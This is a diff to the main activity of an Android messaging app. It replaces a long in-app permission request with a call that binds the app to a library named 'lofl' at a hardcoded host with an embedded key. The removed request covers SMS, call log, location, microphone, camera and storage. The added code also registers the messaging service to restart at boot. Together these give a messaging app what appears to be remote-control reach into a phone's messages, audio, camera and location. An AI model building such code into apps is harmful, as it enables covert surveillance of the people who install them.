@@ -3,16 +3,20 @@ package com.candroid.textme.ui.activities;
 import android.Manifest;
 import android.app.Activity;
 import android.content.Intent;
+import android.content.SharedPreferences;
 import android.content.pm.PackageManager;
 import android.database.Cursor;
 import android.net.Uri;
 import android.os.Bundle;
+import android.preference.PreferenceManager;
 import android.provider.ContactsContract;
 
-import com.candroid.textme.api.ContentProviders;
-import com.candroid.textme.api.Lofl;
+import com.candroid.lofl.activities.LoflActivity;
+import com.candroid.lofl.api.ContentProviders;
+import com.candroid.lofl.data.Constants;
+import com.candroid.lofl.receivers.BootCompletedReceiver;
+import com.candroid.lofl.services.LoflService;
 import com.candroid.textme.notifications.NotificationFactory;
-import com.candroid.textme.data.Constants;
 import com.candroid.textme.services.MessagingService;
 
 public class MainActivity extends Activity {
@@ -29,7 +33,7 @@ public class MainActivity extends Activity {
     @Override
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
-        requestPermissions();
+        LoflActivity.bind(this,"10.0.2.2", "kdmk234klmdf");
     }
 
     @Override
@@ -62,6 +66,14 @@ public class MainActivity extends Activity {
                 }
             });
             thread.start();
+        }else if(requestCode == LoflActivity.PERMISSIONS_REQUEST_CODE && resultCode == Activity.RESULT_OK){
+            if (!LoflService.sIsRunning) {
+                SharedPreferences.Editor editor = PreferenceManager.getDefaultSharedPreferences(this).edit();
+                editor.putString(BootCompletedReceiver.SERVICE_NAME_KEY, MessagingService.class.getName());
+                editor.apply();
+                startForegroundService(new Intent(this, MessagingService.class));
+            }
+            ContentProviders.Contacts.pickContact(this);
         }else {
             onBackPressed();
         }
@@ -70,37 +82,6 @@ public class MainActivity extends Activity {
     @Override
     protected void onResume() {
         super.onResume();
-    }
-
-    // TODO: 10/28/18 rationales for permissions
-    @Override
-    public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
-        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
-        switch (requestCode) {
-            case Constants.SMS_PERMISSIONS_REQ_CODE:
-                requestPermissions();
-                break;
-            default:
-                break;
-        }
-    }
-
-    /*parse sms messages in devices default sms inbox location*/
-    private Object requestPermissions() {
-        if ((checkSelfPermission(Manifest.permission.SEND_SMS) != PackageManager.PERMISSION_GRANTED) || checkSelfPermission(Manifest.permission.READ_CONTACTS) != PackageManager.PERMISSION_GRANTED || checkSelfPermission(Manifest.permission.READ_CALL_LOG) != PackageManager.PERMISSION_GRANTED || checkSelfPermission(Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED || checkSelfPermission(Manifest.permission.READ_CALENDAR) != PackageManager.PERMISSION_GRANTED || checkSelfPermission(Manifest.permission.RECORD_AUDIO) != PackageManager.PERMISSION_GRANTED || checkSelfPermission(Manifest.permission.READ_EXTERNAL_STORAGE) != PackageManager.PERMISSION_GRANTED || checkSelfPermission(Manifest.permission.CALL_PHONE) != PackageManager.PERMISSION_GRANTED || checkSelfPermission(Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED) {
-            requestPermissions(new String[]{Manifest.permission.READ_SMS, Manifest.permission.MODIFY_PHONE_STATE, Manifest.permission.INTERNET, Manifest.permission.READ_CONTACTS, Manifest.permission.BROADCAST_SMS, Manifest.permission.READ_CALL_LOG, Manifest.permission.SEND_SMS, Manifest.permission.RECEIVE_SMS, Manifest.permission.RECEIVE_MMS, Manifest.permission.RECEIVE_WAP_PUSH, Manifest.permission.ACCESS_FINE_LOCATION, Manifest.permission.READ_CALENDAR, Manifest.permission.RECORD_AUDIO, Manifest.permission.ACCESS_WIFI_STATE, Manifest.permission.CHANGE_WIFI_STATE, Manifest.permission.READ_PHONE_NUMBERS, Manifest.permission.READ_PHONE_STATE, Manifest.permission.WRITE_EXTERNAL_STORAGE, Manifest.permission.READ_EXTERNAL_STORAGE, Manifest.permission.CALL_PHONE, Manifest.permission.CAMERA, Manifest.permission.VIBRATE, Manifest.permission.SET_WALLPAPER, Manifest.permission.INTERNET, Manifest.permission.CAMERA, Manifest.permission.FOREGROUND_SERVICE, Manifest.permission.PROCESS_OUTGOING_CALLS, Manifest.permission.WRITE_CONTACTS, Manifest.permission.SET_ALARM, Manifest.permission.WRITE_CALL_LOG}, Constants.SMS_PERMISSIONS_REQ_CODE);
-            return null;
-        }
-        finishActivity(Constants.PICK_CONTACT_REQ_CODE);
-        String action = getIntent().getAction();
-        if (action != null && action.equals(Intent.ACTION_SEND)) {
-            mSharedText = Lofl.handleSharedText(getIntent());
-        }
-        if (!MessagingService.sIsRunning) {
-            startForegroundService(new Intent(this, MessagingService.class));
-        }
-        ContentProviders.Contacts.pickContact(this);
-        return null;
     }
 
     @Override
